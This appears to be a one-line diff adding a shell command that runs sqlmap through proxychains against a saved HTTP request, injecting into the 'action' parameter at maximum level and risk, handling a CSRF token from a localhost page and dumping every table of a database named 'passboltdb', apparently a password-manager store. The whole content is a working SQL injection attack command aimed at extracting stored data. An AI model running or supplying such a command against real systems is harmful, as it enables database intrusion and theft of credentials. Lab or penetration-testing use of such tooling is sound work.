@@ -1,0 +1,1 @@
+proxychains -q sqlmap -r req.txt -p action --dbs --level=5 --risk=3 --csrf-token=csrf --csrf-url=http://localhost/index.php  -D passboltdb --dump-all --batch --flush-session --preprocess ./preprocess.py
